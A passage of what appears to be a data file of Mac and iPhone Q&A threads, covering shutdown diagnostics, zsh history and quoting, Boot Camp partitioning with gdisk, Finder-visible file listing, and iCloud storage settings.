macOS App store and search for \"photos extension\"). Select the photo, click \"Edit\" then click the button with the 3 dots in it to start the extension.\n", "Q: How to determine a genuine AirPods bud (just one - left) from a fake one? I have my AirPods 1st generation (bought it in the Apple store), the problem is that I lost my left bud, so I am going to buy one.\nAfter research, I found out that there are a lot of not genuine (fake) AirPods spare parts (like buds). After googling it was found out that there are minor diffs between genuine and fake ones, but they all related to the AirPods case. In other words, there is almost no way to find out (if you buy just one bud and not the entire AirPods + case) if you buy origin or a fake one.\nSo, the question is that true - if you buy just one bud without the case, there is no way to find out is it genuine or fake?\n\nA: This depends on how well done the fake is. You'll have to compare the details of an original to the one you want to buy. There is no single mark that you could compare, as every counterfeit is different. The safest bet to get an official replacement is to buy it at an official source, such as an Authorized Apple Service Provider.\n", "Q: How to type em-dash with a croatian keyboard layout?

The display will go black, then the keyboard lights will turn off about 5 seconds later. Then it turns off completely. Then I'll have to hit the power button to boot it back up. This usually seems to happen when I use Chrome. But it has happened after opening other apps. I did a Malware search, found nothing, and I have plenty of disk space and RAM. I thought it was the version of Mac I was using, so I updated to Big Sur. Still having the same issue.\nNothing shows up in my crash reports in the console.\nBut this is what I saw in the system log around the time of the crash:\nSep 18 07:22:08 HP-23500 syslogd[63]: ASL Sender Statistics\nSep 18 07:22:23 HP-23500 com.apple.xpc.launchd[1] (com.apple.mdworker.shared.04000000-0300-0000-0000-000000000000[1052]): Service exited due to SIGKILL | sent by mds[92]\nSep 18 07:23:54 localhost bootlog[0]: BOOT_TIME 1631967834 0\nSep 18 07:24:06 localhost syslogd[63]: Configuration Notice:\n    ASL Module \"com.apple.cdscheduler\" claims selected messages.\n    Those messages may not appear in standard system log files or in the ASL database.\nSep 18 07:24:06 localhost syslogd[63]: Configuration Notice:\n    ASL Module \"com.apple.install\" claims selected messages.\n    Those messages may not appear in standard system log files or in the ASL database.\nSep 18 07:24:06 localhost syslogd[63]: Configuration Notice:\n    ASL Module \"com.apple.authd\" sharing output destination \"/var/log/asl\" with ASL Module \"com.apple.asl\".\n    Output parameters from ASL Module \"com.apple.asl\" override any specified in ASL Module \"com.apple.authd\".\nSep 18 07:24:06 localhost syslogd[63]: Configuration Notice:\n    ASL Module \"com.apple.authd\" sharing output destination \"/var/log/system.log\" with ASL Module \"com.apple.asl\".\n    Output parameters from ASL Module \"com.apple.asl\" override any specified in ASL Module \"com.apple.authd\".\nSep 18 07:24:06 localhost syslogd[63]: Configuration Notice:\n    ASL Module \"com.apple.authd\" claims selected messages.\n    Those messages may not appear in standard system log files or in the ASL database.\nSep 18 07:24:06 localhost syslogd[63]: Configuration Notice:\n    ASL Module \"com.apple.eventmonitor\" claims selected messages.\n    Those messages may not appear in standard system log files or in the ASL database.\nSep 18 07:24:06 localhost syslogd[63]: Configuration Notice:\n    ASL Module \"com.apple.mail\" claims selected messages.\n    Those messages may not appear in standard system log files or in the ASL database.\nSep 18 07:24:06 localhost syslogd[63]: Configuration Notice:\n    ASL Module \"com.apple.performance\" claims selected messages.```\n\nI don't know how to read log/crash reports, but I'm trying to learn. \n\n\nA: A shutdown cause of -128 is a catch-all code that means that the SMC does not know the reason for the power loss. Given SMC's extensive heuristics for determining shutdown causes, this is basically a 100% certain indication of either a software or firmware bug or a hardware failure. (More often the latter.)\nDiagnosing root cause will be impossible due to the specialized debugging tools and access to proprietary schematics and source code which you will need. Only Apple can do this.\nThe best you can do is continue gathering circumstantial data. Start paying close attention to the apps you are running, the tasks you are performing, the peripherals you have attached, and other environmental variables. In addition to following your own intuition, here are a couple of questions I would ask:\n\n*\n\n*How old is your battery? (I.e., what model & year is your machine, presuming that you haven't done a battery replacement?) Old batteries can experience voltage sag under load and lead to -128 shutdowns due to the sudden loss of power.\n\n*You specifically mention using Chrome. Chrome is known to have many problems on Mac due to its nonstandard implementation of resource management, among other reaons, and has often been a contributing factor to a lot of problems. One possible involvement in your case may be to stress the GPU during page rendering if its hardware acceleration feature is enabled, which puts load on the battery and can cause the power loss I mentioned above. Try not using Chrome and switch to Safari for a while to see if the problem goes away.\n\n*Do you see new logs appearing in /Library/Logs/DiagnosticReports? Specifically, anything ending in .crash, .hang, or .panic.\n\nUPDATE:\nFrom comments:\nBattery:\n Cycle Count: 1045\n Condition: Service Recommended\n\nBased on your cycle count, the battery needs to be replaced. This will likely fix your issue (and also give you longer battery life as a bonus).\n", "Q: URL or settings file to share IPSec VPN settings to iPhone I have IPSec/L2TP server and I want to share connection settings via single URL or settings file to open and apply it in a single click on ios devices.

Back when I used this mouse on my Windows computer, the button ended up setting itself to typing this whenever it was pushed: \"www.bit.ly/upcpromo2018[return]\", and now using it on my Mac, it does the same thing. I would like to change that, but I can't figure out how. It's a wireless mouse, it doesn't have any side buttons, on the top it says Universal Orlando Studios Partner Comm (smudge), and on the bottom is a label saying\n2.4GHz Wireless Optical Mouse\nModel NO.: TUV2406\nRating : 1.5V === 6.8mA\nTested To Comply With FCC Standards\nFOR HOME OR OFFICE USE\n\nHere are some pictures:\n\n\n\nA: How to customize IE button on mouse\nIn short, you probably can't. Let me explain.\nA quick Google search for \"TUV2406\" does supply with a user manual, but it is very limited. It does provide you with the specifications for the mouse and it does mention under the Compatible section \"no need driver\" [sic].\nThere are two more clues to this mystery.\n\n*\n\n*The \"www.bit.ly/upcpromo2018\" address leads to a Universal Parks & Resorts Partner Community.\n\n*The Universal Orlando Partner Community logo you mentioned.\n\nThis leads me to believe that it was a special promo item.

I inserted not the original (very cheap) multiport adapter into the machine and connected it via an HDMI cable to an external monitor. As a result, I was using it for about five minutes and turned it off due to the fact that It was wildly lagging.\nFrom the consequences: the Touchbar fell off partially - it was not possible to configure through the standard procedure in the settings (I fixed it myself through the terminal) + began to work much slower noticeably - visually, the performance dropped much - my 2016 MBP will perform about the same as this from 2020. I tried to make a full reset through the recovery, but it is bricked. Hopefully, I got help from an authorized center of Apple and they changed the system board and the Touch ID. Everything is working now, but it still lags noticeably - at the time of purchase and for the first two weeks, it just flew ... Now even booting before the password takes 19 seconds and then a lot of time after inputting the password. Also, it takes a lot of time to open regular apps like Chrome, Word, PowerPoint - it is not comparable to what how it was before…\nDoes anyone have ideas what could be the reason for it and possible steps to make it better? I already checked it with some test as Cinebench, DriveDx, GeekBench, and DiskDrill. Not something that indicates the problems.\nWould be glad to hear any possible next steps!  \n\nA: With the limited information we currently have, based on your description of these problems starting when you plugged in your cheapo multiport adapter and now persist without it, one possibility (albeit not highly probable) is that the adapter caused electrical damage to the USB-C controller associated with one of your ports. One failure mode for such damage is that the controller can become permanently stuck in reset cycles, which causes an interrupt storm and serializes some critical kernel resources behind the driver software which is now constantly servicing the controller resets.\nThis is only one scenario of many possibilities. The multiport adapter might also be a red herring and you might have a completely unrelated issue that coincidentally began at the time that your multiport adapter caused a shutdown.\nWe could keep thinking of more scenarios. Instead, let's start diagnosing this issue the way that we would diagnose any unexplained performance loss: By analyzing a spindump.\n\n*\n\n*Run the following Terminal command to enable kernel symbolication: sudo nvram boot-args=\"keepsyms=1\". Make sure to copy-paste this so that you're entering straight quotes rather than curly/“smart” quotes. (If you get a permission error, you will first need to disable System Integrity Protection. You can re-enable it after you're done with this investigation.)\n\n*Reboot your machine and don’t open any apps except for Terminal.\n\n*In Terminal, enter the following command, press Return, type in your password, but do not press Return again yet: sudo spindump -reveal -noProcessingWhileSampling\n\n*Perform an operation that you believe is now unreasonably slow (e.g., open Powerpoint).\n\n*As soon as you begin to feel the slowness, go to the Terminal window where you entered your password and press Return so that the command begins to execute. Do not do anything else on the computer while it's running, otherwise you will distort the data collection.\n\n*After waiting for >10 seconds to collect a sample and another minute or two to symbolicate and format, you’ll get a file in /tmp/spindump.txt that contains a stackshot of every process.\n\n*Upload the file to PasteBin or some equivalent place and add the link to it to your original question. We can take a look at it and come up with next steps for the investigation.\n\n\nA: Sounds to me like the problem may be the adapter or hdmi cable you used before and after.\n", "Q: Sketch app input field value not increase/decrease with arrows key I am running Catalina on my MacBook Pro mid 2014 retina.\nFrom few days I am having strange issue with my Sketch app. I can’t increase/decrease input values from arrows key.

Finder complained that nine songs were \"not copied because the audio format is not supported by the iPhone.\"\nI knew that those songs had played before.  I looked at one of them in Finder, and it is .mp3  I then found it on the iPhone, meaning it was copied.  And tapped it, and it did play.\nWhat's going on here?\n\nA: I found out that the new update only supports 128kbps mp3 format, so i had to convert and redownload them all to be able to add them to my iphone.\n", "Q: macOS .zsh_sessions, .zsh_history, and `setopt APPEND_HISTORY` On macOS, there is a sessions directory that combines commands from multiple zsh sessions into a single history file.\nIs it necessary to use zsh shell options in the .zshrc file, to manipulate how zsh handles history, so that commands are appended to .zsh_history, or are these options redundant and ignored?\nI see many people recommend, when transitioning from bash to zsh, to add the following options to make history include commands from other sessions and add other functionality (that appears to be built in):\nAPPEND_HISTORY\nHISTFILE=~/.zsh_history\nHISTSIZE=100000000\nSAVEHIST=100000000\nsetopt INC_APPEND_HISTORY\n[...]\n\nHowever, it seems those are built in and needn't be specified.\nBonus question: Can one list multiple shell options after a single setopt, instead of having each option in a separate setopt statement?\n\nA: On macOS, /etc/zshrc contains (among other things) the following lines:\n# Save command history\nHISTFILE=${ZDOTDIR:-$HOME}/.zsh_history\nHISTSIZE=2000\nSAVEHIST=1000\n\nThis is the reason you don't need to set those on macOS (and many other OSes): It's already done for you. However, you are of course free to override these values in your .zshrc file. Note, though, that it's recommended to make $HISTSIZE (how much history is kept in memory) at least 20% larger than $SAVEHIST (how much memory is saved to file). Read https://zsh.sourceforge.io/Doc/Release/Options.html#History for more info.\nIf (and only if) you are using Apple's Terminal.app, then /etc/zshrc in turn calls /etc/zshrc_Apple_Terminal. In there, we find (among other things):\n# Resume Support: Save/Restore Shell State\n\nfollowed by a bunch of code ported from macOS's /etc/bashrc_Apple_Terminal. In zsh, this code is largely unnecessary, as the Z Shell can do the same with just the SHARE_HISTORY shell option.\nTo use Zsh's implementation instead of Apple's:\n\n*\n\n*Add to your  .zshenv file:\nSHELL_SESSIONS_DISABLE=1\n\n\n\n*Add to your .zshrc file:\nsetopt SHARE_HISTORY\n\n\n\n*In your Zsh dotfiles, make sure you don't set any options incompatible with SHARE_HISTORY. Again, read https://zsh.sourceforge.io/Doc/Release/Options.html#History for more info.\n\n*Delete the .zsh_sessions dir created by Apple's code.\n\n\n\nBonus question: can we list options after setopt instead of having each one on a new line?\n\nYes, you can pass as many options as you like to setopt. Just try it on the command line.\n", "Q: Apple Watch stopped Monday update of my move goal Sometime a few months ago, my Apple Watch stopped offering an updated move goal on Monday mornings.

No error message. But the ~/Documents folder was still there (in Finder and in the Terminal -- confirmed by ls and stat).\nIf you attempted to navigate to this \"deleted\" ~/Documents folder (for example with Cmd Shift O): the breadcrumb in the Finder window would just say Documents (with no parent folders).\nThis scuppered my plan to \"rename ~/Docs to become my new ~/Documents folder\". I was likewise disallowed from executing (for example) mkdir ~/Documents, on the grounds that such a folder \"already existed\".\nSo, lift-and-shift wasn't possible. And I didn't want to use the ghost ~/Documents whilst it was clearly displaying the wrong absolute filepath in Finder.\nI needed to get back to at least having a \"no more broken than usual\" ~/Documents folder.\nI rebooted, and my ~/Documents folder was back to \"as broken as usual\" (i.e. the Finder breadcrumb presented the correct absolute filepath).\nI believe the reason it self-repaired is related to some iCloud sync behaviour. Users that have iCloud sync enabled for their Documents folder will find that it is empty (maybe absent?) until a few seconds after login. I do not have iCloud sync enabled, but I suspect some support here tried to enforce that \"there should always be a Documents folder\".\nSo, reboot may have been overkill: a logout/login may have sufficed.\nAnyway, my ~/Documents folder is still cursed. To the extent that even deleting it and regenerating it didn't help. Any more ideas?\nAlternatively, does anybody know a way to rebind Finder's Cmd + Shift + O to navigate me to my new ~/Docs folder?\n\nA: I use the answer from, because I can't give the command in comment mode\nCan you try this command from terminal to reset user permissions :\ndiskutil resetUserPermissions / `id -u`\n\n", "Q: How to list in Terminal only files visible in Finder? I know how to view hidden files in the Finder. Instead, what I'd like to do is list files in the shell/Terminal by the same criteria that the Finder uses for files that are hidden. (My objective is to collect metrics using a cronjob/launchd script that are consistent with what appears in the UI.)\nThis is proving to be more difficult than it sounds. Here is an example case of the ways I am aware of to hide a file from the Finder (Big Sur 11.6, Apple Silicon, APFS):\nmkdir test\ncd test\ntouch regular hidden invisible .dotfile\nSetFile -a V invisible\nchflags nohidden invisible\nchflags hidden hidden\n\nThis requres that SetFile be present, which is available with Developer Tools.\nThe expected outcome of the command or script is one file, regular. All three of the other files are not visible in Finder under usual circumstances. I would like the solution to only require native tools (no Developer Tools or gnu coreutils/homebrew and the like).\nSo far, my approach would be to loop through all files output by ls -lO | awk 'NR!=1 && $5!~/hidden/ { print $0 }' (this filters out dotfiles and the hidden file flag), and use GetFileInfo (another Developer Tool installed alongside SetFile) to filter out the invisible attribute. However, this requires that Developer Tools be installed, which I would prefer to avoid the dependency on, and also seems awkward and excessively complicated--and likely also inefficient if there are thousands of files in a directory.\nI suspect that the other options would be to manually parse the output of xattr -px com.apple.FinderInfo invisible (more complicated but avoids the GetFileInfo dependency) or to use osascript to somehow make use of the Finder's existing logic instead of attempting to reimplement it using BSD tools.\nEdit: Since apparently some users' setfile commands set the hidden flag, I added chflags nohidden invisible to the test case since it is entirely likely for the filesystem to contain files (created via other means) which only have the extended attribute FinderInfo flag and do not have the BSD file flag.\n\nA: Originally posted as a comment on the off-chance this might produce the required result, although wasn’t able to test myself at the time.  However, the OP confirmed that, on his system (Big Sur 11.6, Apple Sillicon, APFS), the following command returns the contents of a directory that matches what is visible in a Finder window that is opened and pointed at the directory path:\ntell application id (\"com.apple.systemevents\") ¬\n        to get every item in the folder named ¬\n        \"/path/to/folder\" where it is visible\n\nThis returns a list of file and folder references that resolve much faster than Finder file references.  It will be even more performant if one retrieves a list of file paths instead:\ntell application id (\"com.apple.systemevents\") ¬\n        to get the POSIX path of every item in ¬\n        folder \"/path/to/folder\" whose visible ¬\n        is true\n\nSince System Events accepts simple file paths in place of file references as parameters in many of its commands (e.g. move, delete, etc.), this can speed things up dramatically, and in most cases, will be infinity time quicker than Finder without blocking it.\nShould you require an alias list in order to make use of commands only available through Finder, e.g. reveal, then†:\ntell application id (\"com.apple.systemevents\") ¬\n        to get every alias in the folder named ¬\n        \"/path/to/folder\" where it is visible\n\ntell application id (\"com.apple.Finder\") ¬\n        to get the result as alias list\n\n\n† tbc\n", "Q: ZSH conflict with Python setuptools extras and pip?

zipp-3.5.0\nbash-3.2$ \n\n\nA: TL,DR:\npip install --upgrade webchanges\\[use_browser]\n\n\npip install --upgrade webchanges[use_browser] has mostly the same meaning in bash and zsh: webchanges[use_browser] is a wildcard pattern (“glob”). See bash pattern matching, zsh filename generation). […] means “one character, which is any of the characters between the brackets”. So if the current directory contains the files\nwebchanges webchangesa webchangesb webchangesc webchangesd webchangese webchangeser zebchangese\n\nthen the shell runs the command\npip install --upgrade webchangesb webchangese\n\nWhere bash and zsh differ is what happens when a pattern doesn't match any file. Bash (and other sh-compatible shells) pass the pattern unchanged to the command. Zsh, by default, signals an error.\nThe solution, in sh, bash or zsh, is to quote the special character [ (bash quoting, zsh quoting). You can quote ] for symmetry but you don't need to: it only has a special meaning when there's an unquoted [ before it to close. For example:\npip install --upgrade 'webchanges[use_browser]'\npip install --upgrade webchanges\\[use_browser]\npip install --upgrade webchanges\\[use_browser\\]\n\nLikewise you need to quote < or > in a pip requirement specifier so that it isn't parsed as indicating a redirection. In zsh you also need to quote either of the equal signs in == to avoid equal expansion if magic_equal_subst is enabled and equals is not disabled.\npip install webchanges\\>1.2.3\npip install webchanges\\>=1.2.3\npip install webchanges\\==1.2.3\npip install webchanges=\\=1.2.3\n\n", "Q: iCloud Drive Preview folder shows persistent iCloud icon The Preview folder in iCloud Drive shows a persistent dashed-line iCloud icon.

This app's page has a lowercase \"update\" button, which is suspicious for 2 reasons: 1) normally the update button is uppercase and 2) as far as I can tell, this app is not installed on my phone (searching for it in the app library yields no results).\nThis app does not show up in an app store search but \"One Click Cleaner Pro\" (with a space between \"one\" and \"click\") does. I believe that neither my own device nor my family member's device has been deliberately jailbroken.\nAny ideas what's going on?\n\n\nA: This could be an app that's no longer for sale, the name has changed, or there's other App Store or developer restrictions that prevent it from being seen when searching.\nWhen I searched the web for this app, I saw a privacy policy result from a app named TurboCleaner Pro from Loop Lead Consulting, the same company in your screenshot:\n\nYou should go to Apple's report a problem site and complete the form about this app.\n", "Q: Nikon Tethered to iPad, iPhone on import, duplicate images appear I am using a Nikon Z7 and Z7II. Connected via the Apple camera connection kit to an iPad Mini 5 (14.7.1) and an iPhone 6s Plus (14.7.1). As I shoot, the images will appear in the \"import\" screen of the Photos app. However, they show up duplicated. They are not duplicated on the camera. If I disconnect the camera and reconnect, they are no longer duplicated. Only new pictures taken while the camera is connected appear duplicated. This happens in multiple apps that import images directly from a camera. This makes it difficult to work on a shoot as the screen becomes cluttered by dozens of duplicated images. Connecting and reconnecting to clear the screen is not an option during a shoot.\nUPDATE:\n-This happens with both JPEG and RAW.\n-When I test on my Mac Mini, it works properly and only shows the single image in Image Capture. As it should.\n-I am not shooting RAW and JPEG at the same time.

Something is wrong with the motherboard and it won't boot. It has software on it that won't run on a newer OS than Maverick (such as Photoshop CS6). Therefore, I still want to use the drive if possible. Minimum, I need to get a lot of data, photos, etc off that drive.\nI have a new MacBook Air with the M1 chip. I am able to mount the drive and look around and even run some applications but obviously not Photoshop. When loading the boot options at startup, the drive does not appear as a bootable option but can be seen when opening disk utility.\nQuestions:\n\n*\n\n*Is it possible to boot from this drive on this laptop? (I have been unsuccessful as of yet)\n\n*Is there any way to run this drive through another application to get it to work in full such as VirtualBox, Parallels, etc.?\n\n\nA: No. El Capitan is not compiled for Apple Silicon and will not be able to run on it.\nThere are efforts to run it in emulation software like QEMU (see this post on reddit), which would emulate an Intel CPU, however it is not officially supported.\n\nA: No, but to get the data off the drive, you can just connect it and read the files. The filesystem is readable even when the OS won’t boot new hardware.\nI would run migration assistant if you need help getting the data back, but the programs it’s better to buy an old vintage Mac or intel based one that can run an OS that meets your app needs or one to replace the exact OS needed.\nUsed Intel Mac mini are very reasonably priced for the ones that can’t run Big Sur or newer. Great headless machines to run all your old macOS versions and old apps.\nIt’s also still early days for virtualizing Intel CPU on Apple Silicon, so in several months you might have other options.\n\nA: The disk is not bootable, since the earliest MacOS with drivers for the m1 is Big Sur. This is how it is for all macs. There is a way to run this in VM but it is very hard. I’m afraid that you’ll have to get an old Mac.

I need to update iPhone to get important security updates. I do not have access to a wifi connection, and even when I do, cellular is much more performant: in Australia, about 20 times better download on 5G than on broadband (250 Mbps vs ~25 Mbps).\nHow an I work around Apple's archaic restriction that makes updating an iPhone impossible without wifi?\n\nA: Try with iTunes with a laptop (where you make an Access Point from your phone).\nSo PC is connected via 5G via phone, and then you download the update and install it via iTunes.\n", "Q: Unable to reinstall MacOS, Prohibited sign after booting to bootable USB installer So I have this very old Macbook Pro, this was given to me and it's 7 years since then. I don't know the specific model but the previous OS installed is OS X El Capitan 10.11.4.\nCREATION OF BOOTABLE FLASHDRIVE\nSo I go to the official support of apple on how to create a bootable USB flash drive. I downloaded the El Capitan 10.11 since it's the previous OS I have and I want to avoid compatibility issues, I just want to do a clean install. I have a very fast internet connection and I'm pretty sure that the installer I downloaded is not corrupted. I do this on the Macbook Pro itself and the creation of Bootable USB Flashdrive is successful. I do this just in case the online installation failed.\nINSTALLATION USING ONLINE INSTALLER\nNow, I booted into the system recovery first and from the Disk Utility, I completely erase the content of my SSD storage. Then I go back and use the option of online installation, upon signing in I got an error saying This item is temporarily unavailable, I tried it again and again but it won't proceed. I found by searching that this is a known issue and the option is by using an offline installer by creating a bootable installer which is to happen that I have from the beginning.\nINSTALLATION USING OFFLINE INSTALLER\nSo I plugin my bootable USB Flashdrive, I press and hold the OPTION button while booting, I selected the USB Flashdrive which is in the boot list. The Apple logo shows up with the loading bar, after that this happened;\n\nI tried it again, power off the machine, and boot then the same thing happened. Apple logo shows up with a loading bar after that the prohibited sign shows up again.\nI search and people say that this is something related to the corrupted installer. I have fast internet and 6GB of El Capitan DMG file took only 5 minutes, well I thought maybe they are right so I opened up my Windows computer, and using VirtualBox with High Sierra installed on it I recreated the Bootable Flashdrive. I downloaded the El Capitan installer again and create it, but after booting the same issue. I tried with other installers such as Sierra 10.12, El Capitan 10.11, Yosemite 10.10 but they all have the same issue.\nSo what does this mean in the first place? And how can I push the installation?\n\nA: Alright, there is a missing step and Apple failed to provide it. Seeing this prohibited sign on the boot means either the installer is corrupted or because of a security permission issue on USB Flashdrive.\n\n*\n\n*Create a bootable USB Flashdrive, as stated from the official support of Apple.\n\n*Once it's done, and the creation is successful, Uncheck the Ignore ownership. To do this, simply right-click on the bootable USB Flashdrive you created, at the bottom of the window click to expand the option Sharing & Permissions: then you will see the ignore ownership, uncheck it, and don't forget to save by clicking the lock icon.\n\nFound the same solution from this link.\nhttps://www.lifewire.com/create-emergency-os-x-boot-device-2260173\nMac won't boot from USB drive: Prohibited sign\n", "Q: Will the apps share cloud saves and some in-game purchases from Android device to iPad? I recently pre-ordered the iPad 9th Gen. , because I like using big screens for gaming and content consumption. I also have Samsmung S20 Ultra, which I am using (until the bad boy arrives), for regular usage, including playing games.\nMostly, I play Clash of Clans, Boom Beach, Hay Day, Bubble Witch and SimCity - Build it, GTA Mobile games, Terraria. Most of them use their own sign up / login  systems, and have their own accounts and cloud storage. But, my question is more of a generalized sense.\nSome other purchases/subscriptions include Netflix, Amazon Prime, Disney + Hostar (in India), Tasker (paid version),  etc.\nI have made some purchases in these apps. In some cases, they are in-app currencies and in other like Terraria, Tasker, the complete apps themselves.\nNow, I want to use my Samsung Android phone only for some games, and call, message, whatsapp, etc., while all the video contents and games will be transferred to iPad. So, my questions are :-\n\n*\n\n*Will I be able to keep all in-game purchases for all games ?\n\n*Will I be able to cross-save (like I cant carry my iPad everywhere, so I will keep Clash of Clans in the Android device as well)\n\n*Do I need to pay Netflix, Amazon prime subscription again?\n\n*What is the difference between iTunes and App Store, and which one is used to buy apps and stuff?\n\nI might sound funny, but I have never used an Apple Device on a personal basis . So, it will be helpful if anyone would explain how things work, in some detail.\nEdit :- I am aware that I need to re-purchase apps which I purchased from Play Store. But, I am unsure of videos like Netflix/ Prime Subscription, particularly these two.\n\nA: \nWill I be able to keep all in-game purchases for all games?\n\nThis will very much depend on the app and how in-game purchases are handled. Usually, if you have an account for that app they can be transferred.\n\nWill I be able to cross-save (like I cant carry my iPad everywhere, so I will keep Clash of Clans in the Android device as well)?\n\nYes, this does work with Clash of Clans and many other apps. However, this also may depend on the exact app.\n\nDo I need to pay Netflix, Amazon prime subscription again?\n\nNo, they are linked to an e-mail address and you can use the same subscription on multiple devices although there is a downloads (i.e. you can't download unlimited hours of content onto your devices) limit.\n\nWhat is the difference between iTunes and App Store, and which one is used to buy apps and stuff?\n\nThese days for most users only the AppStore is important, this is where you download and search apps, start updates and can see family shared apps. iTunes is now mainly used to buy music. It used to be Apples main online marketplace for digital media, but for the last years apple has split e.g. films into a separate app (tv).\n\nA: It depends on the app, so there is no general answer for this. Things like Netflix etc which are designed to be used on several devices (you can watch Netflix with the same account from Android, PC, Mac, iOS etc) will work as expected. For games it may be different depending on how the account management works in-game.\nPS: The App Store is for Apps, the iTunes Store is for music.\n", "Q: How can I fill the page when printing an MS word document with comments \nI have a word document with comments. I wanna print it with the comments, but when I try, the document and the comments pane are shrunk, and do not fill the A4 paper properly (check photo). Tried changing the paper size from word, it went horribly. Is there any solution for this problem? No need for it to be in Word. \nIf not, is there a way to present the comments inline, just pushed by a level (like in reply messages?) \nThanks in advance!\n\n\nA: You get this result while printing with comments because Word tries to fit each original page to a single page while printing.\nYou can fill the paper better and get a more readable printout if you change the document's orientation from portrait to landscape before printing it out. This would cause both the appearance and pagination of the printed document to be different from the original but the paper would be better filled and the printout would be easier to read. You can change the document's orientation back to its original after printing it out.\nYou can change the document's orientation to Landscape either from Layout -> Orientation -> Landscape or File -> Page Setup (Page Attributes) -> Orientation.

I wouldn't care unless this lib started to be linked against one of the GUI apps I am writing and I started getting the notorious message:\nDEPRECATION WARNING: The system version of Tk is deprecated and may be removed in a future release.

Apparently some paths got messed up which resulted in such weird behaviour.\nSo, does anyone know why they still package the old Tk version? Is it possible to just remove it manually?\n\nA: The point of deprecations is to include something for the sake of compatibility with old software, but mark it so that developers are aware that they should not create new dependencies on it, and that they should seek to remove the dependency from newer updates for their software.\nThere's not point in removing it it manually.

So you are asking why the partition can not boot. Well, the reason is because the partition does not exist in the MBR partition table.\n\nQuestion-2: How do I flag the Windows-7 partition as bootable using fdisk or gdisk or any other utility ? (Tried using gdisk, but it only provides option to work with \"One to Three\" partitions, while I have 5)\n\nYou can use gdisk and omit the 4th partition in the GPT when copying the table entries to the MBR partition table. The interactive commands to enter into gdisk are given below.\nr\nh\n2 3 5\ny\naf\nn\nab\nn\n07\ny\nw\ny\n\nBelow are a few comments.\n\n*\n\n*The changes made by gdisk may be changed by future use of the diskutil command or the Disk Utility application. If so, then you will need reenter the above commands in to gdisk. One possible solution to this problem would be to install Windows as the second partition on the drive. This would require a manual installation of Windows since the Boot Camp Assistant can not do this.\n\n\n*The installation of Catalina may be detected by Windows 7. If so, you should be able to fix any Windows 7 boot issues created from the Catalina installation by rebuilding the BCD.\n\n\n*You should be able to run Windows 10 on this Mac. Upgrading from Windows 7 may still be a free. However, I have not verified the free upgrade for at least a year. You should also be able to do a clean install of Windows 10 using the Windows Support Software Apple provides for your Mac.\nUpdate Regarding Windows 10\nThe Boot Camp Support Software (Windows Support Software) containing Boot Camp Version 4.0 (Build 4033) is the latest containing Windows drivers provided by Apple for your model Mac. An image of the installer is shown below.\n\nAccording to Apple these drivers can be used with 64 bit BIOS booting Windows 7 on your Mac. While Apple does not provide Windows 10 drivers for your model Mac, usually the Windows 7 drivers can be substituted, when installing 64 bit Windows 10 to BIOS boot. (Note: The setup.exe application, included with Boot Camp Support Software, has to be executed in Windows 7 Compatibility Mode.) Also, note that Apple Software Update and/or Windows Update may provide newer drivers.\n\nThere is also this link from Apple to download a BootCampESD.pkg file. This file can be used to install (by default) the WindowsSupport.dmg file to the \"/Library/Application Support/BootCamp\" directory. The WindowsSupport.dmg file contains the Windows drivers for your Mac.\n\nSo far you have stated (in your question and comments) you can BIOS boot from an USB flash drive and the installation of the Boot Camp Support Software 4.0.4033 after upgrading from Windows 7 to Windows 10 does not fix the driver issues. The ability to BIOS boot from an USB flash drive surprises me, since this conflicts with what I have encountered helping others install Windows 10 on Macs similar to yours. You have stated a clean install of Windows 10, followed by the installation of the Boot Camp Support Software 4.0.4033, does fix the driver issues. Which is good to know.\n", "Q: Is it safe to encrypt the VM Volume on recent macOS versions? Background info: I need my McBook to satisfy a newly-rolled-out policy of having \"full disk encryption\". The relevant software checks this by seeing if all user-mountable volumes/partitions on internal drives are encrypted, or in the process of becoming such. Checking its debug logs, this includes the VM volume, which is created by the macOS installer.\nEDIT: Upon closer inspection, the APFS container actually has (had) two VM volumes - one visible, mounted under /Volumes/VM and another one, not visible to the user, mounted under /System/Volumes/VM - this one seems to be ignored by the policy software, as I initially expected.\nI have a few questions regarding this:\n\n*\n\n*Is it even normal/expected that the VM volume is mountable by the human user? macOS does this thing where \"system-essential\" partitions/volumes are, among other things, hidden in the GUI disk utility, and not mounted by default - the Recovery, Preboot volumes, the EFI partition, etc. My macOS installation did not start *with a blank disk, and in fact the APFS container used by the Big Sur system is inherited from a Mojave installation. If this volume visibility is not normal, I'd like to know how to revert it back - the software in question does skip over Recovery and Preboot, so it's not completely stupid.\n\n*Is it safe to encrypt this volume? Finder doesn't seem to mind and offers this option just as it does on any other, user-created APFS volume.\n\n\nA: The contents of the VM volume is always encrypted - its contents is called \"secure virtual memory\":\nhttps://support.apple.com/en-gb/guide/mac-help/mh11852/mac\nFileVault does not need to be enabled on the volume, as the data contents itself is encrypted.\n", "Q: Any problems using a M1 Macbook pro with a 34\" ultrawide external monitor I am currently using 2 22\" dell monitors for external displays.

The IP address listed is the IP address of your computer in this private network.\nNow to make sure that the Expo server uses this private network instead of your WiFi for communicating with the phone, you set its initial interface like this in the Terminal:\nexport EXPO_DEVTOOLS_LISTEN_ADDRESS=169.254.246.125\nexport REACT_NATIVE_PACKAGER_HOSTNAME=169.254.246.125\nexpo start\n\nReplace 169.254.246.125 with the actual IP address you see listed for your computer.\nIf you also want to share the internet connection of your Mac with the phone, you can do that from System Preferences > Sharing > Internet Sharing. This enables NAT, so you will experience that the interface on your Mac, as well as the interface on your iPhone, now have different IP addresses, and you'll need to update the commands above accordingly.\n\nA: You basically want some apps you are developing to connect to a web server locally on your PC.\nAll you need to to do is to create a Wireless Local Area Network (LAN) beween your PC and iPhone using a WiFi router. That's it. Once both the PC and the iPhone are connected by Wifi to the router, your iPhone apps should be easily able to communicate with the web server on your PC using the PC's local IP address.\nIf you don't want to use a router, and connect your iPhone directly to your Mac, just activate Wifi Hotspot on your Mac using \"Internet Sharing\", and connect your iPhone directly to it through wifi. To do this on your mac, go to System Preferences > Sharing > Internet Sharing (More details here - share the Internet connection on Mac with other network users).\n", "Q: How to delete photos from local disk on Mac without deleting in iCloud? I have around 5 GB for photos on iCloud and it gets automatically downloaded to my MacBook which is only 256 GB. Is there a way to have the photos on iCloud without having them on the local machine. Something like how Google Photos does. Unless specified, it doesn't download the photos on to the local machine.\n\nA: Photos Preferences → iCloud → Optimise Mac Storage.\n\nOptimize Mac Storage: To save space on your Mac by storing full-resolution originals in iCloud and keeping smaller versions on the computer when needed, select this option.\n\nhttps://support.apple.com/guide/photos/pht5156cc968/mac\nCaches are purgeable space, which will be reclaimed by the system automatically as free disk space decreases.\n", "Q: How can I limit the disk usage of the Rosetta 2 oah cache? On macOS 11, Rosetta2 apparently caches translated programs and shared libraries under 